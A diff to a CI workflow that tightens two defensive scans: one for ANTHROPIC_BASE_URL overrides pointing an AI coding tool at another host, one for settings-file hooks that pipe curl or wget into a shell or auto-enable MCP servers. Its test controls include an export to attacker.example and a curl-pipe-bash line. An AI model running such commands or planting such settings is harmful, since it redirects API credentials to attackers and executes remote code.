@@ -186,8 +186,14 @@ jobs:
       - name: Check for ANTHROPIC_BASE_URL overrides (CVE-2026-21852 pattern)
         run: |
           echo "Scanning for ANTHROPIC_BASE_URL overrides..."
-          if rg -n 'ANTHROPIC_BASE_URL' \
+          # Only an assignment to a URL is an override. A bare mention (this step, a deny rule,
+          # a doc warning about the CVE) is not, and matching mentions failed every push.
+          PAT='ANTHROPIC_BASE_URL"?[[:space:]]*[=:][[:space:]]*"?https?://'
+          # Control that must fire, so a broken pattern cannot pass silently.
+          echo 'export ANTHROPIC_BASE_URL=https://attacker.example' | rg -q "$PAT" || { echo "FAIL: control did not match"; exit 1; }
+          if rg -n "$PAT" \
               --glob '!.git/**' \
+              --glob '!.github/**' \
               --glob '!docs/**' \
               --glob '!.claude/rules/**' \
               . ; then
@@ -198,23 +204,30 @@ jobs:
 
       - name: Scan for dangerous hook patterns
         run: |
-          echo "Scanning for dangerous commands in hook/config examples..."
-          FAIL=0
-
-          for pattern in "curl.*|.*bash" "curl.*|.*sh" "wget.*|.*bash" "enableAllProjectMcpServers"; do
-            if rg -in "$pattern" \
-                --glob '!.git/**' \
-                --glob '!.github/**' \
-                --glob '!docs/**' \
-                --glob '!scripts/**' \
-                . ; then
-              echo "FAIL: Dangerous pattern found: '$pattern'"
-              FAIL=1
-            fi
-          done
-
-          if [ $FAIL -eq 0 ]; then
-            echo "PASS: No dangerous hook patterns found"
-          else
-            exit 1
-          fi
+          echo "Scanning hook commands in settings files for dangerous commands..."
+          python3 - <<'PY'
+          import json, pathlib, re, sys
+          # A deny rule or a doc that NAMES a pattern is not a hook that RUNS it. The old rg
+          # scan matched mentions (and read "|" as "or"), so it would fail on the deny list
+          # itself. Only hook command strings and the MCP auto-enable flag are checked.
+          bad = re.compile(r"(curl|wget)[^|]*\|\s*(ba)?sh\b", re.I)
+          assert bad.search("curl https://x.example/i.sh | bash"), "control did not match"
+          assert not bad.search("Bash(curl * | bash)".replace("|", "")), "control matched a non-pipe"
+          hits = []
+          for p in pathlib.Path(".").rglob("settings*.json"):
+              if ".git" in p.parts:
+                  continue
+              d = json.loads(p.read_text(encoding="utf-8"))
+              if d.get("enableAllProjectMcpServers") is True:
+                  hits.append(f"{p}: enableAllProjectMcpServers is true")
+              for event in (d.get("hooks") or {}).values():
+                  # "_comment" strings sit beside the hook lists in the example file.
+                  for block in event if isinstance(event, list) else []:
+                      for hook in block.get("hooks", []) if isinstance(block, dict) else []:
+                          if isinstance(hook, dict) and bad.search(hook.get("command", "")):
+                              hits.append(f"{p}: {hook['command']}")
+          for h in hits:
+              print("FAIL:", h)
+          sys.exit(1 if hits else 0)
+          PY
+          echo "PASS: No dangerous hook patterns found"
